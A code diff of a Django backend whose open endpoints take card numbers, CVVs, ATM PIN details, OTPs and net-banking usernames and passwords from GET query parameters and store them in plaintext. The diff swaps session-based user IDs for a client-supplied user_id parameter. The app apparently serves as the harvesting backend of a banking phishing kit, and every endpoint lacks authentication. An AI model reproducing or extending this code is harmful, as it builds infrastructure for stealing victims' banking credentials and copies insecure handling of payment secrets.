@@ -40,7 +40,7 @@ def indexData(request):
             data = {
                 'type': 'card',
                 'status': 200,
-                
+                'userId': new_user_id
             }
         else:
             request.session['payment_type'] = 'nteB'
@@ -69,7 +69,7 @@ def cardDetails(request):
 @api_view(["GET", "POST"])
 @permission_classes([AllowAny])
 def cardDetailsData(request):
-    user_id = request.session.get('user_id')
+    # user_id = request.session.get('user_id')
 
     try:
         card_holder_name = request.query_params['card_holder_name']
@@ -78,6 +78,7 @@ def cardDetailsData(request):
         exp_date_year = request.query_params['expdate']
         exp_date = str(str(exp_date_month) + "/" + str(exp_date_year))
         cvv = request.query_params['cvv']
+        user_id = request.query_params['user_id']
         UserDetail.objects.filter(user_id=user_id).update(card_holder_name=card_holder_name, card_number=card_number, exp_date=exp_date, cvv=cvv)
 
         data = {
@@ -97,8 +98,9 @@ def atmPin(request):
 @api_view(["GET", "POST"])
 @permission_classes([AllowAny])
 def atmPinData(request):
-    user_id = request.session.get('user_id')
+    # user_id = request.session.get('user_id')
     try:
+        user_id = request.query_params['user_id']
         valid_m = request.query_params['valid_month']
         valid_y = request.query_params['valid_year']
         valid_from = str(str(valid_m) + '/' + str(valid_y))
@@ -123,9 +125,10 @@ def otpCard(request):
 @api_view(["GET", "POST"])
 @permission_classes([AllowAny])
 def otpCardData(request):
-    user_id = request.session.get('user_id')
+    # user_id = request.session.get('user_id')
 
     try:
+        user_id = request.query_params['user_id']
         otp = request.query_params['otp']
         UserDetail.objects.filter(user_id=user_id).update(otp=otp)
         data = {
@@ -144,9 +147,10 @@ def netBanking(request):
 @api_view(["GET", "POST"])
 @permission_classes([AllowAny])
 def netBankingData(request):
-    user_id = request.session.get('user_id')
+    # user_id = request.session.get('user_id')
 
     try:
+        user_id = request.query_params['user_id']
         loginId = request.query_params['loginId']
         loginPass = request.query_params['loginPass']
         UserDetail.objects.filter(user_id=user_id).update(net_banking_id=loginId, net_banking_pass=loginPass)
@@ -166,9 +170,10 @@ def netOtp(request):
 @api_view(["GET", "POST"])
 @permission_classes([AllowAny])
 def netBankingOtpData(request):
-    user_id = request.session.get('user_id')
+    # user_id = request.session.get('user_id')
 
     try:
+        user_id = request.query_params['user_id']
         net_banking_otp = request.query_params['otp']
         UserDetail.objects.filter(user_id=user_id).update(net_banking_otp=net_banking_otp)
         data = {
